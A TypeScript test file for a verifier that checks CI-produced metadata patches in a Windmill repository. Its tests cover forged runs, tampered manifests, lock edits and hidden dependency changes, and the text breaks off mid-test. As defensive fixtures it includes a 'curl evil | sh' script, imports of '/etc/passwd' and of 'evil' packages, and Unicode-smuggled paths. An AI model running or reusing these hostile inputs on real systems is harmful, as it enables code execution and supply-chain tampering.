import { describe, expect, test } from "bun:test";
import { readFileSync } from "node:fs";
import { MAX_FILE_BYTES } from "../../f/factory/lib/metadata_patch_manifest.ts";
import {
  checkProvenance,
  MAX_SOURCES,
  type PrDiffEntry,
} from "../../f/factory/lib/metadata_patch_verify.ts";
import {
  addExistingScript,
  BASE,
  BASE_TIP,
  codeOf,
  EMPTY_LOCK,
  EMPTY_LOCK_PATH,
  encoder,
  HASH_NEW,
  HASH_OLD,
  HEAD,
  LOCK,
  OTHER_LOCK,
  scriptYaml,
  verify,
  wmillLock,
  world,
} from "./metadata_patch_verify_world.ts";

describe("verifyMetadataPatch accepts a correct patch", () => {
  test("accepts a patch for a changed script", async () => {
    expect(await codeOf(world())).toBe("ok");
  });

  test("returns the files to write in path order", async () => {
    const result = await verify(world());
    expect(result.ok && result.writes.map((write) => write.path)).toEqual([
      "f/factory/foo.script.lock",
      "f/factory/foo.script.yaml",
      "wmill-lock.yaml",
    ]);
  });

  test("returns the content of the patch", async () => {
    const result = await verify(world());
    const lock = result.ok
      ? result.writes.find((w) => w.path === "f/factory/foo.script.lock")
      : undefined;
    expect(new TextDecoder().decode(lock?.content)).toBe(LOCK);
  });

  test("accepts a repository name that differs in case", async () => {
    const w = world();
    w.run = { ...w.run, headRepositoryFullName: "Acme/Widgets" };
    expect(await codeOf(w)).toBe("ok");
  });

  test("accepts the lock of an importer of a changed file", async () => {
    const w = world();
    addExistingScript(w, "baz", 'import "./foo.ts";\n');
    w.patch.set("f/factory/baz.script.lock", LOCK);
    expect(await codeOf(w)).toBe("ok");
  });

  test("accepts the lock of an importer written with a multi-line import", async () => {
    const w = world();
    addExistingScript(
      w,
      "baz",
      'import {\n  a,\n  b,\n} from "./lib/bar.ts";\n',
    );
    w.patch.set("f/factory/baz.script.lock", LOCK);
    expect(await codeOf(w)).toBe("ok");
  });

  test("accepts a new script that has no dependency", async () => {
    const w = world();
    w.head.set("f/factory/newone.ts", "export function main() {}\n");
    w.pr = {
      ...w.pr,
      diff: [{ path: "f/factory/newone.ts", status: "added" }],
    };
    w.patch = new Map<string, string | Uint8Array>([
      ["f/factory/newone.script.lock", EMPTY_LOCK],
      ["f/factory/newone.script.yaml", scriptYaml("newone")],
      [
        "wmill-lock.yaml",
        wmillLock({
          "f/factory/foo": HASH_OLD,
          "f/factory/other": HASH_OLD,
          "f/factory/newone": HASH_NEW,
        }),
      ],
    ]);
    w.statuses.set("f/factory/newone.script.lock", "added");
    w.statuses.set("f/factory/newone.script.yaml", "added");
    expect(await codeOf(w)).toBe("ok");
  });
});

describe("verifyMetadataPatch with the committed files", () => {
  test("accepts a patch made of the committed lock, schema and hashes", async () => {
    const lock = readFileSync("f/factory/approval_decide.script.lock", "utf8");
    const yaml = readFileSync("f/factory/approval_decide.script.yaml", "utf8");
    const hashes = readFileSync("wmill-lock.yaml", "utf8");
    const w = world();
    w.head = new Map<string, string | Uint8Array>([
      ["f/factory/approval_decide.ts", "export function main() {}\n"],
      ["f/factory/approval_decide.script.lock", lock],
      [
        "f/factory/approval_decide.script.yaml",
        yaml.replace("type: object", "type: string"),
      ],
      [
        "wmill-lock.yaml",
        hashes.replace(/(approval_decide: )[0-9a-f]{64}/, `$1${HASH_OLD}`),
      ],
    ]);
    w.base = new Map<string, string | Uint8Array>([
      ["f/factory/approval_decide.ts", "export function main() {}\n"],
      ["f/factory/approval_decide.script.lock", lock],
    ]);
    w.pr = {
      ...w.pr,
      diff: [{ path: "f/factory/approval_decide.ts", status: "modified" }],
    };
    w.patch = new Map<string, string | Uint8Array>([
      ["f/factory/approval_decide.script.lock", lock],
      ["f/factory/approval_decide.script.yaml", yaml],
      ["wmill-lock.yaml", hashes],
    ]);
    expect(await codeOf(w)).toBe("ok");
  });
});

describe("verifyMetadataPatch checks where the run comes from", () => {
  test("rejects a run of a fork", async () => {
    const w = world();
    w.run = { ...w.run, headRepositoryFullName: "mallory/widgets" };
    expect(await codeOf(w)).toBe("head_repository_mismatch");
  });

  test("rejects a run without a head repository", async () => {
    const w = world();
    w.run = { ...w.run, headRepositoryFullName: null };
    expect(await codeOf(w)).toBe("head_repository_mismatch");
  });

  test("rejects a run of another workflow", async () => {
    const w = world();
    w.run = { ...w.run, workflowPath: ".github/workflows/evil.yml" };
    expect(await codeOf(w)).toBe("workflow_path_mismatch");
  });

  test("rejects a run of another event", async () => {
    const w = world();
    w.run = { ...w.run, event: "push" };
    expect(await codeOf(w)).toBe("event_mismatch");
  });

  test("rejects a run of another pull request", async () => {
    const w = world();
    w.run = { ...w.run, pullRequestNumbers: [7] };
    expect(await codeOf(w)).toBe("pull_request_mismatch");
  });

  test("rejects a run of an older head", async () => {
    const w = world();
    w.run = { ...w.run, headSha: "e".repeat(40) };
    expect(await codeOf(w)).toBe("run_head_sha_mismatch");
  });

  test("rejects a run that did not fail", async () => {
    const w = world();
    w.run = { ...w.run, conclusion: "success" };
    expect(await codeOf(w)).toBe("run_not_failed");
  });

  test("rejects a run whose metadata job did not fail", async () => {
    const w = world();
    w.run = { ...w.run, metadataJobConclusion: "success" };
    expect(await codeOf(w)).toBe("metadata_job_not_failed");
  });

  test.each([
    [".github/workflows/ci.yml"],
    ["mise.toml"],
    ["bunfig.toml"],
    ["package.json"],
    ["scripts/metadata-patch.ts"],
    ["infra/docker-compose.yml"],
    ["wmill.yaml"],
    ["f/../mise.toml"],
    ["fx/a.ts"],
  ])("rejects a PR that touches %s", async (path) => {
    const w = world();
    w.pr = {
      ...w.pr,
      diff: [...w.pr.diff, { path, status: "modified" }],
    };
    expect(await codeOf(w)).toBe("pr_diff_not_allowed");
  });

  test("rejects a PR that renames a file out of a protected place", async () => {
    const w = world();
    const renamed: PrDiffEntry = {
      path: "f/factory/moved.ts",
      status: "renamed",
      previousPath: "scripts/old.ts",
    };
    w.pr = { ...w.pr, diff: [...w.pr.diff, renamed] };
    expect(await codeOf(w)).toBe("pr_diff_not_allowed");
  });

  test.each([["migrations/a.sql"], ["docs/a.md"], ["tests/a.test.ts"]])(
    "accepts a PR that also touches %s",
    async (path) => {
      const w = world();
      w.pr = {
        ...w.pr,
        diff: [...w.pr.diff, { path, status: "modified" }],
      };
      expect(await codeOf(w)).toBe("ok");
    },
  );

  test("rejects a diff that GitHub cut short", async () => {
    const w = world();
    w.pr = { ...w.pr, diffTruncated: true };
    expect(await codeOf(w)).toBe("pr_diff_incomplete");
  });
});

describe("verifyMetadataPatch checks the manifest and the files", () => {
  test("rejects an archive without a manifest", async () => {
    const w = world();
    w.tamperArchive = (archive) => archive.delete("manifest.json");
    expect(await codeOf(w)).toBe("manifest_missing");
  });

  test("rejects a manifest that is not JSON", async () => {
    const w = world();
    w.tamperArchive = (archive) =>
      archive.set("manifest.json", encoder.encode("{"));
    expect(await codeOf(w)).toBe("manifest_invalid");
  });

  test("rejects a manifest with a path outside the allowed list", async () => {
    const w = world();
    w.patch.set(".github/workflows/ci.yml", "name: x\n");
    expect(await codeOf(w)).toBe("manifest_invalid");
  });

  test("rejects a manifest made for an older head", async () => {
    const w = world();
    w.tamperManifest = (manifest) => {
      manifest.headSha = "e".repeat(40);
    };
    expect(await codeOf(w)).toBe("manifest_head_sha_mismatch");
  });

  test("rejects a deleted entry", async () => {
    const w = world();
    w.tamperManifest = (manifest) => {
      manifest.entries = [
        ...(Array.isArray(manifest.entries) ? manifest.entries : []),
        { path: "f/factory/other.script.lock", status: "deleted" },
      ];
    };
    expect(await codeOf(w)).toBe("deleted_entry");
  });

  test("rejects a path that differs only in case", async () => {
    const w = world();
    w.head.set("f/factory/Foo.ts", "export const z = 1;\n");
    w.patch.set("f/factory/Foo.script.lock", LOCK);
    expect(await codeOf(w)).toBe("case_collision");
  });

  test("rejects a protected path", async () => {
    const w = world();
    w.patch.set("f/factory/lib/dependabot_support.script.yaml", "x: 1\n");
    expect(await codeOf(w)).toBe("protected_path");
  });

  test("rejects a file that the manifest does not list", async () => {
    const w = world();
    w.tamperArchive = (archive) =>
      archive.set("files/f/factory/extra.script.lock", encoder.encode("x"));
    expect(await codeOf(w)).toBe("unlisted_file");
  });

  test("rejects a top-level file that is not the manifest", async () => {
    const w = world();
    w.tamperArchive = (archive) =>
      archive.set("run.sh", encoder.encode("curl evil | sh"));
    expect(await codeOf(w)).toBe("unlisted_file");
  });

  test("rejects an entry whose file is missing", async () => {
    const w = world();
    w.tamperArchive = (archive) =>
      archive.delete("files/f/factory/foo.script.yaml");
    expect(await codeOf(w)).toBe("missing_file");
  });

  test("rejects a file whose content changed after the manifest", async () => {
    const w = world();
    w.tamperArchive = (archive) =>
      archive.set(
        "files/f/factory/foo.script.lock",
        encoder.encode(LOCK.replace("1.3.0", "1.5.0")),
      );
    expect(await codeOf(w)).toBe("digest_mismatch");
  });

  test("rejects a file whose size differs from the manifest", async () => {
    const w = world();
    w.tamperArchive = (archive) =>
      archive.set(
        "files/f/factory/foo.script.lock",
        encoder.encode(`${LOCK}\n`),
      );
    expect(await codeOf(w)).toBe("size_mismatch");
  });
});

describe("verifyMetadataPatch checks the history", () => {
  test("rejects a base sha that is not in the history of the base", async () => {
    const w = world();
    w.isAncestor = (_ancestor, descendant) => descendant !== BASE_TIP;
    expect(await codeOf(w)).toBe("base_not_in_base_history");
  });

  test("rejects a head that does not contain the base sha", async () => {
    const w = world();
    w.isAncestor = (_ancestor, descendant) => descendant !== HEAD;
    expect(await codeOf(w)).toBe("head_lacks_base");
  });

  test("rejects when the ancestry cannot be decided", async () => {
    const w = world();
    w.isAncestor = () => null;
    expect(await codeOf(w)).toBe("ancestry_unknown");
  });

  test("rejects a merge commit whose parents are swapped", async () => {
    const w = world();
    w.parents = [HEAD, BASE];
    expect(await codeOf(w)).toBe("merge_parents_mismatch");
  });

  test("rejects a merge commit with a third parent", async () => {
    const w = world();
    w.parents = [BASE, HEAD, BASE_TIP];
    expect(await codeOf(w)).toBe("merge_parents_mismatch");
  });

  test("rejects a merge commit that cannot be read", async () => {
    const w = world();
    w.parents = null;
    expect(await codeOf(w)).toBe("merge_commit_unavailable");
  });
});

describe("verifyMetadataPatch limits which scripts may change", () => {
  test("rejects a script that the PR did not touch", async () => {
    const w = world();
    addExistingScript(w, "other2", "export const y = 1;\n");
    w.patch.set("f/factory/other2.script.lock", LOCK);
    expect(await codeOf(w)).toBe("script_not_affected");
  });

  test("rejects a lock without a source", async () => {
    const w = world();
    w.head.delete("f/factory/foo.ts");
    expect(await codeOf(w)).toBe("no_source");
  });

  test("rejects the lock of a script whose source is protected", async () => {
    const w = world();
    addExistingScript(
      w,
      "steps/dependabot_assess",
      'import "../lib/bar.ts";\n',
    );
    w.patch.set("f/factory/steps/dependabot_assess.script.lock", LOCK);
    expect(await codeOf(w)).toBe("protected_source");
  });

  test("rejects a new script yaml whose source the PR did not add", async () => {
    const w = world();
    w.patch.set("f/factory/foo2.script.yaml", scriptYaml("foo2"));
    w.statuses.set("f/factory/foo2.script.yaml", "added");
    w.head.set("f/factory/foo2.ts", 'import "./lib/bar.ts";\n');
    expect(await codeOf(w)).toBe("new_script_without_source");
  });

  test("rejects a status that does not match the tree", async () => {
    const w = world();
    w.statuses.set("f/factory/foo.script.lock", "added");
    expect(await codeOf(w)).toBe("status_mismatch");
  });

  test("rejects a modified file that does not exist", async () => {
    const w = world();
    w.head.delete("f/factory/foo.script.yaml");
    expect(await codeOf(w)).toBe("status_mismatch");
  });

  test("rejects a lock whose bytes differ from the head tree", async () => {
    const w = world();
    w.patch.set(
      "f/factory/foo.script.lock",
      new Uint8Array([0xff, 0xfe, 0x00]),
    );
    expect(await codeOf(w)).toBe("lock_changed");
  });
});

describe("verifyMetadataPatch checks the script yaml", () => {
  test("rejects an added tag", async () => {
    const w = world();
    w.patch.set(
      "f/factory/foo.script.yaml",
      `${scriptYaml("foo", "string")}tag: console\n`,
    );
    expect(await codeOf(w)).toBe("script_yaml_invalid");
  });

  test("rejects a lock reference to another file", async () => {
    const w = world();
    w.patch.set(
      "f/factory/foo.script.yaml",
      scriptYaml("foo", "string").replace(
        "foo.script.lock",
        "other.script.lock",
      ),
    );
    expect(await codeOf(w)).toBe("script_yaml_invalid");
  });

  test("rejects a new script yaml with a timeout", async () => {
    const w = world();
    w.head.set("f/factory/newone.ts", "export function main() {}\n");
    w.pr = {
      ...w.pr,
      diff: [{ path: "f/factory/newone.ts", status: "added" }],
    };
    w.patch = new Map<string, string | Uint8Array>([
      ["f/factory/newone.script.lock", EMPTY_LOCK],
      [
        "f/factory/newone.script.yaml",
        `${scriptYaml("newone")}timeout: 9999\n`,
      ],
    ]);
    w.statuses.set("f/factory/newone.script.lock", "added");
    w.statuses.set("f/factory/newone.script.yaml", "added");
    expect(await codeOf(w)).toBe("script_yaml_invalid");
  });
});

describe("verifyMetadataPatch checks the lock hashes", () => {
  test("rejects a removed key", async () => {
    const w = world();
    w.patch.set("wmill-lock.yaml", wmillLock({ "f/factory/foo": HASH_NEW }));
    expect(await codeOf(w)).toBe("wmill_lock_key_removed");
  });

  test("rejects a changed hash of a script that is not affected", async () => {
    const w = world();
    w.patch.set(
      "wmill-lock.yaml",
      wmillLock({ "f/factory/foo": HASH_NEW, "f/factory/other": HASH_NEW }),
    );
    expect(await codeOf(w)).toBe("wmill_lock_key_not_allowed");
  });

  test("rejects a hash for a flow", async () => {
    const w = world();
    w.patch.set(
      "wmill-lock.yaml",
      wmillLock({
        "f/factory/foo": HASH_NEW,
        "f/factory/other": HASH_OLD,
        "f/factory/x__flow+__flow_hash": HASH_NEW,
      }),
    );
    expect(await codeOf(w)).toBe("wmill_lock_key_not_allowed");
  });

  test("rejects an unknown version", async () => {
    const w = world();
    w.patch.set(
      "wmill-lock.yaml",
      wmillLock({ "f/factory/foo": HASH_NEW }).replace("v2", "v9"),
    );
    expect(await codeOf(w)).toBe("wmill_lock_invalid");
  });

  test("rejects a hash that is not hexadecimal", async () => {
    const w = world();
    w.patch.set(
      "wmill-lock.yaml",
      wmillLock({
        "f/factory/foo": "z".repeat(64),
        "f/factory/other": HASH_OLD,
      }),
    );
    expect(await codeOf(w)).toBe("wmill_lock_invalid");
  });

  test("rejects a hash for a script whose source is protected", async () => {
    const w = world();
    addExistingScript(w, "steps/dependabot_assess", "export const a = 1;\n");
    w.pr = {
      ...w.pr,
      diff: [
        ...w.pr.diff,
        { path: "f/factory/steps/dependabot_assess.ts", status: "modified" },
      ],
    };
    w.head.set(
      "wmill-lock.yaml",
      wmillLock({
        "f/factory/foo": HASH_OLD,
        "f/factory/other": HASH_OLD,
        "f/factory/steps/dependabot_assess": HASH_OLD,
      }),
    );
    w.patch.set(
      "wmill-lock.yaml",
      wmillLock({
        "f/factory/foo": HASH_NEW,
        "f/factory/other": HASH_OLD,
        "f/factory/steps/dependabot_assess": HASH_NEW,
      }),
    );
    expect(await codeOf(w)).toBe("wmill_lock_key_not_allowed");
  });
});

describe("metadata_patch_verify review", () => {
  describe("verifyMetadataPatch limits the script yaml to changed sources", () => {
    test("rejects the yaml of a script whose imported file changed", async () => {
      const w = world();
      w.pr = {
        ...w.pr,
        diff: [{ path: "f/factory/lib/bar.ts", status: "modified" }],
      };
      expect(await codeOf(w)).toBe("script_not_affected");
    });

    test("accepts the lock of a script whose imported file changed", async () => {
      const w = world();
      w.pr = {
        ...w.pr,
        diff: [{ path: "f/factory/lib/bar.ts", status: "modified" }],
      };
      w.patch.delete("f/factory/foo.script.yaml");
      expect(await codeOf(w)).toBe("ok");
    });

    test("rejects a variable reference in the schema", async () => {
      const w = world();
      w.patch.set(
        "f/factory/foo.script.yaml",
        `${scriptYaml("foo", "string")}  default: $var:u/admin/secret\n`,
      );
      expect(await codeOf(w)).toBe("script_yaml_invalid");
    });

    test("rejects a resource reference in the schema", async () => {
      const w = world();
      w.patch.set(
        "f/factory/foo.script.yaml",
        `${scriptYaml("foo", "string")}  default: $res:u/admin/db\n`,
      );
      expect(await codeOf(w)).toBe("script_yaml_invalid");
    });
  });

  describe("verifyMetadataPatch keeps the lock of an existing script", () => {
    test("rejects a lock that differs from the head tree", async () => {
      const w = world();
      w.patch.set("f/factory/foo.script.lock", LOCK.replace("1.3.0", "1.4.0"));
      expect(await codeOf(w)).toBe("lock_changed");
    });

    test("rejects a lock with an added dependency", async () => {
      const w = world();
      w.patch.set(
        "f/factory/foo.script.lock",
        LOCK.replace('"left-pad"', '"is-odd": "1.0.0",\n    "left-pad"'),
      );
      expect(await codeOf(w)).toBe("lock_changed");
    });

    test("rejects a lock that differs by one byte", async () => {
      const w = world();
      w.patch.set("f/factory/foo.script.lock", `${LOCK}\n`);
      expect(await codeOf(w)).toBe("lock_changed");
    });

    test("rejects when the lock in the head tree cannot be read", async () => {
      const w = world();
      w.headFailures.add("f/factory/foo.script.lock");
      expect(await codeOf(w)).toBe("head_unreadable");
    });

    test("rejects a lock that equals the head tree but differs from the base tip", async () => {
      const w = world();
      w.base.set("f/factory/foo.script.lock", OTHER_LOCK);
      expect(await codeOf(w)).toBe("lock_changed");
    });

    test("rejects a lock the author edited by hand together with the source", async () => {
      const w = world();
      w.head.set("f/factory/foo.script.lock", OTHER_LOCK);
      w.patch.set("f/factory/foo.script.lock", OTHER_LOCK);
      expect(await codeOf(w)).toBe("lock_changed");
    });

    test("rejects when the base tip has no lock for an existing script", async () => {
      const w = world();
      w.base.delete("f/factory/foo.script.lock");
      expect(await codeOf(w)).toBe("lock_changed");
    });

    test("rejects when the lock in the base tip cannot be read", async () => {
      const w = world();
      w.baseFailures.add("f/factory/foo.script.lock");
      expect(await codeOf(w)).toBe("base_unreadable");
    });

    test("checks the lock of an importer that the manifest does not carry", async () => {
      const w = world();
      addExistingScript(w, "baz", 'import "./foo.ts";\n');
      w.head.set("f/factory/baz.script.lock", OTHER_LOCK);
      expect(await codeOf(w)).toBe("lock_changed");
    });

    test("does not ask a source without a lock for one", async () => {
      const w = world();
      w.head.set("f/factory/x__flow/step.ts", "export const a = 1;\n");
      w.base.set("f/factory/x__flow/step.ts", "export const a = 0;\n");
      w.pr = {
        ...w.pr,
        diff: [
          ...w.pr.diff,
          { path: "f/factory/x__flow/step.ts", status: "modified" },
        ],
      };
      expect(await codeOf(w)).toBe("ok");
    });
  });

  describe("verifyMetadataPatch refuses a change of dependencies", () => {
    test("rejects a bare import added to a changed script", async () => {
      const w = world();
      w.head.set(
        "f/factory/foo.ts",
        'import { x } from "./lib/bar.ts";\nimport pad from "left-pad@1.4.0";\n',
      );
      expect(await codeOf(w)).toBe("dependency_change_requires_human");
    });

    test("rejects a bare import removed from a changed script", async () => {
      const w = world();
      w.base.set(
        "f/factory/foo.ts",
        'import { x } from "./lib/bar.ts";\nimport pad from "left-pad@1.4.0";\n',
      );
      expect(await codeOf(w)).toBe("dependency_change_requires_human");
    });

    test("rejects another version of the same package", async () => {
      const w = world();
      w.base.set("f/factory/foo.ts", 'import pad from "left-pad@1.3.0";\n');
      w.head.set("f/factory/foo.ts", 'import pad from "left-pad@1.4.0";\n');
      expect(await codeOf(w)).toBe("dependency_change_requires_human");
    });

    test("rejects a bare import that arrives through a changed library", async () => {
      const w = world();
      w.head.set("f/factory/lib/bar.ts", 'import pad from "left-pad@1.4.0";\n');
      expect(await codeOf(w)).toBe("dependency_change_requires_human");
    });

    test("rejects a change in an importer that the manifest does not carry", async () => {
      const w = world();
      addExistingScript(w, "baz", 'import "./foo.ts";\n');
      w.head.set(
        "f/factory/baz.ts",
        'import "./foo.ts";\nimport "evil@1.0.0";\n',
      );
      expect(await codeOf(w)).toBe("dependency_change_requires_human");
    });

    test("rejects an import hidden between quotes in comments", async () => {
      const w = world();
      w.head.set(
        "f/factory/foo.ts",
        '/*\'*/import x from "evil";/*\'*/\nimport { y } from "./lib/bar.ts";\n',
      );
      expect(await codeOf(w)).toBe("dependency_change_requires_human");
    });

    test("accepts an import that only appears in a comment", async () => {
      const w = world();
      w.head.set(
        "f/factory/foo.ts",
        '// import x from "evil";\nimport { y } from "./lib/bar.ts";\n',
      );
      expect(await codeOf(w)).toBe("ok");
    });

    test.each([
      ["a variable", "await import(name);"],
      ["a concatenation", 'await import("./x" + n);'],
      [
        "a macro attribute",
        'import { m } from "./m.ts" with { type: "macro" };',
      ],
    ])(
      "rejects a changed script with an import made of %s",
      async (_label, code) => {
        const w = world();
        w.head.set("f/factory/foo.ts", `${code}\n`);
        expect(await codeOf(w)).toBe("dependency_change_requires_human");
      },
    );

    test("rejects when the source in the base tree cannot be read", async () => {
      const w = world();
      w.baseFailures.add("f/factory/foo.ts");
      expect(await codeOf(w)).toBe("base_unreadable");
    });

    test("rejects when a library in the base tree cannot be read", async () => {
      const w = world();
      w.baseFailures.add("f/factory/lib/bar.ts");
      expect(await codeOf(w)).toBe("base_unreadable");
    });

    test("rejects a script that is not in the base tree and imports a package", async () => {
      const w = world();
      w.base.delete("f/factory/foo.ts");
      w.head.set("f/factory/foo.ts", 'import pad from "left-pad@1.4.0";\n');
      expect(await codeOf(w)).toBe("dependency_change_requires_human");
    });
  });

  /** PRが新しいscriptを足した状態。lockは空lockで、yamlとハッシュも付ける。 */
  function withNewScript(source: string) {
    const w = world();
    w.head.set("f/factory/newone.ts", source);
    w.pr = {
      ...w.pr,
      diff: [{ path: "f/factory/newone.ts", status: "added" }],
    };
    w.patch = new Map<string, string | Uint8Array>([
      ["f/factory/newone.script.lock", EMPTY_LOCK],
      ["f/factory/newone.script.yaml", scriptYaml("newone")],
      [
        "wmill-lock.yaml",
        wmillLock({
          "f/factory/foo": HASH_OLD,
          "f/factory/other": HASH_OLD,
          "f/factory/newone": HASH_NEW,
        }),
      ],
    ]);
    w.statuses.set("f/factory/newone.script.lock", "added");
    w.statuses.set("f/factory/newone.script.yaml", "added");
    return w;
  }

  describe("verifyMetadataPatch accepts only an empty lock for a new script", () => {
    test("accepts the empty lock of a script without imports", async () => {
      expect(await codeOf(withNewScript("export function main() {}\n"))).toBe(
        "ok",
      );
    });

    test("accepts the empty lock of a script that imports a local file", async () => {
      const w = withNewScript('import { x } from "./lib/bar.ts";\n');
      expect(await codeOf(w)).toBe("ok");
    });

    test("rejects a lock with a dependency", async () => {
      const w = withNewScript("export function main() {}\n");
      w.patch.set("f/factory/newone.script.lock", LOCK);
      expect(await codeOf(w)).toBe("dependency_change_requires_human");
    });

    test("rejects a script that imports a package", async () => {
      const w = withNewScript('import pad from "left-pad@1.3.0";\n');
      expect(await codeOf(w)).toBe("dependency_change_requires_human");
    });

    test("rejects a script that imports a package through a local file", async () => {
      const w = withNewScript('import { x } from "./lib/bar.ts";\n');
      w.head.set("f/factory/lib/bar.ts", 'import pad from "left-pad@1.3.0";\n');
      expect(await codeOf(w)).toBe("dependency_change_requires_human");
    });

    test.each([
      ["a variable", "await import(name);"],
      ["a concatenation", 'await import("./x" + n);'],
      ["a template literal", "await import(`./x`);"],
    ])("rejects a script with an import made of %s", async (_label, code) => {
      expect(await codeOf(withNewScript(`${code}\n`))).toBe(
        "dependency_change_requires_human",
      );
    });

    test("rejects a new lock for a source the PR did not add", async () => {
      const w = withNewScript("export function main() {}\n");
      w.pr = {
        ...w.pr,
        diff: [{ path: "f/factory/foo.ts", status: "modified" }],
      };
      w.head.set("f/factory/newone.ts", 'import "./foo.ts";\n');
      w.head.set("f/factory/foo.ts", 'import "./lib/bar.ts";\n');
      expect(await codeOf(w)).toBe("new_script_without_source");
    });

    test("rejects when the reference empty lock cannot be read", async () => {
      const w = withNewScript("export function main() {}\n");
      w.baseFailures.add(EMPTY_LOCK_PATH);
      expect(await codeOf(w)).toBe("base_unreadable");
    });

    test("rejects when the reference empty lock does not exist", async () => {
      const w = withNewScript("export function main() {}\n");
      w.base.delete(EMPTY_LOCK_PATH);
      expect(await codeOf(w)).toBe("base_unreadable");
    });

    test("compares with the bytes of the reference lock, not a fixed value", async () => {
      const w = withNewScript("export function main() {}\n");
      w.base.set(EMPTY_LOCK_PATH, `${EMPTY_LOCK}\n`);
      expect(await codeOf(w)).toBe("dependency_change_requires_human");
    });
  });

  describe("verifyMetadataPatch requires the metadata of a new script", () => {
    test("rejects a new script whose yaml is missing", async () => {
      const w = withNewScript("export function main() {}\n");
      w.patch.delete("f/factory/newone.script.yaml");
      expect(await codeOf(w)).toBe("new_script_incomplete");
    });

    test("rejects a new script whose lock is missing", async () => {
      const w = withNewScript("export function main() {}\n");
      w.patch.delete("f/factory/newone.script.lock");
      expect(await codeOf(w)).toBe("new_script_incomplete");
    });

    test("accepts a new script whose metadata is already in the head tree", async () => {
      const w = withNewScript("export function main() {}\n");
      w.patch.delete("f/factory/newone.script.lock");
      w.patch.delete("f/factory/newone.script.yaml");
      w.head.set("f/factory/newone.script.lock", EMPTY_LOCK);
      w.head.set("f/factory/newone.script.yaml", scriptYaml("newone"));
      expect(await codeOf(w)).toBe("ok");
    });

    test("does not ask a flow module for metadata", async () => {
      const w = world();
      w.head.set("f/factory/x__flow/step.ts", "export function main() {}\n");
      w.pr = {
        ...w.pr,
        diff: [
          ...w.pr.diff,
          { path: "f/factory/x__flow/step.ts", status: "added" },
        ],
      };
      expect(await codeOf(w)).toBe("ok");
    });
  });

  describe("verifyMetadataPatch reads the head tree", () => {
    test("rejects when a file of the head tree cannot be read", async () => {
      const w = world();
      w.headFailures.add("f/factory/foo.script.yaml");
      expect(await codeOf(w)).toBe("head_unreadable");
    });

    test("rejects when a source that decides the closure cannot be read", async () => {
      const w = world();
      addExistingScript(w, "baz", 'import "./foo.ts";\n');
      w.patch.set("f/factory/baz.script.lock", LOCK);
      w.headFailures.add("f/factory/baz.ts");
      expect(await codeOf(w)).toBe("head_unreadable");
    });

    test("rejects when the hash file of the head tree cannot be read", async () => {
      const w = world();
      w.headFailures.add("wmill-lock.yaml");
      expect(await codeOf(w)).toBe("head_unreadable");
    });
  });

  describe("verifyMetadataPatch cleans the detail", () => {
    const unsafe = ["‮", "​", " ", " ", "\u0085", "\u007f", "﻿", "\n"];

    test.each(unsafe.map((char) => [JSON.stringify(char), char]))(
      "removes %s from the detail",
      async (_label, char) => {
        const w = world();
        w.pr = {
          ...w.pr,
          diff: [
            ...w.pr.diff,
            { path: `scripts/a${char}b.ts`, status: "modified" },
          ],
        };
        const result = await verify(w);
        expect(result.ok ? "" : (result.detail ?? "")).not.toContain(char);
      },
    );

    test("replaces backticks in the detail so a code span cannot be closed", async () => {
      const w = world();
      w.pr = {
        ...w.pr,
        diff: [...w.pr.diff, { path: "scripts/a`b``c.ts", status: "modified" }],
      };
      const result = await verify(w);
      expect(result.ok ? "" : (result.detail ?? "")).toBe(
        "\"scripts/a'b''c.ts\"",
      );
    });

    test("cuts a long detail", async () => {
      const w = world();
      w.pr = {
        ...w.pr,
        diff: [
          ...w.pr.diff,
          { path: `scripts/${"a".repeat(500)}`, status: "modified" },
        ],
      };
      const result = await verify(w);
      expect(result.ok ? 0 : (result.detail ?? "").length).toBeLessThan(200);
    });
  });

  describe("verifyMetadataPatch surfaces port failures", () => {
    test("does not accept a patch when a port throws", async () => {
      const w = world();
      w.ports = {
        readCommitParents: async () => {
          throw new Error("boom");
        },
      };
      await expect(verify(w)).rejects.toThrow("boom");
    });

    test("does not accept a patch when the base port throws", async () => {
      const w = world();
      w.ports = {
        readBaseFile: async () => {
          throw new Error("base down");
        },
      };
      await expect(verify(w)).rejects.toThrow("base down");
    });
  });

  describe("verifyMetadataPatch reads the tree of the base tip", () => {
    test("reads the base files at the tip of the base branch", async () => {
      const w = world();
      await verify(w);
      expect([...new Set(w.baseReads)]).toEqual([BASE_TIP]);
    });

    test("never reads the tree of the sha in the manifest", async () => {
      const w = world();
      await verify(w);
      expect(w.baseReads).not.toContain(BASE);
    });
  });

  describe("verifyMetadataPatch resolves imports as Windmill does", () => {
    const rooted = 'import { x } from "/f/factory/lib/bar.ts";\n';

    test("treats a rooted import as an edge of the closure", async () => {
      const w = world();
      w.head.set("f/factory/foo.ts", rooted);
      w.base.set("f/factory/foo.ts", rooted);
      w.pr = {
        ...w.pr,
        diff: [{ path: "f/factory/lib/bar.ts", status: "modified" }],
      };
      w.patch.delete("f/factory/foo.script.yaml");
      expect(await codeOf(w)).toBe("ok");
    });

    test("follows a rooted import when it compares the dependencies", async () => {
      const w = world();
      w.head.set("f/factory/foo.ts", rooted);
      w.base.set("f/factory/foo.ts", rooted);
      w.head.set("f/factory/lib/bar.ts", 'import pad from "left-pad@1.4.0";\n');
      expect(await codeOf(w)).toBe("dependency_change_requires_human");
    });

    test.each([
      ["a user script", 'import x from "/u/admin/secret";'],
      ["a path outside the tree", 'import x from "/etc/passwd";'],
      ["a file that does not exist", 'import x from "./gone.ts";'],
      [
        "a rooted file that does not exist",
        'import x from "/f/factory/gone.ts";',
      ],
    ])("rejects a changed script that imports %s", async (_label, code) => {
      const w = world();
      w.head.set("f/factory/foo.ts", `${code}\n`);
      w.base.set("f/factory/foo.ts", `${code}\n`);
      expect(await codeOf(w)).toBe("dependency_change_requires_human");
    });

    test("does not read a decoy without an extension", async () => {
      const w = world();
      w.head.set("f/factory/foo.ts", 'import x from "./decoy";\n');
      w.head.set("f/factory/decoy", 'import pad from "left-pad@9.9.9";\n');
      await verify(w);
      expect(w.headReads).not.toContain("f/factory/decoy");
    });

    test("rejects an import that only a decoy could satisfy", async () => {
      const w = world();
      w.head.set("f/factory/foo.ts", 'import x from "./decoy";\n');
      w.base.set("f/factory/foo.ts", 'import x from "./decoy";\n');
      w.head.set("f/factory/decoy", "export const a = 1;\n");
      expect(await codeOf(w)).toBe("dependency_change_requires_human");
    });

    test("resolves the closure and the trace to the same file", async () => {
      const w = world();
      addExistingScript(w, "baz", 'import x from "/f/factory/foo.ts";\n');
      w.patch.set("f/factory/baz.script.lock", LOCK);
      w.head.set(
        "f/factory/foo.ts",
        'import { x } from "../factory/lib/bar.ts";\n',
      );
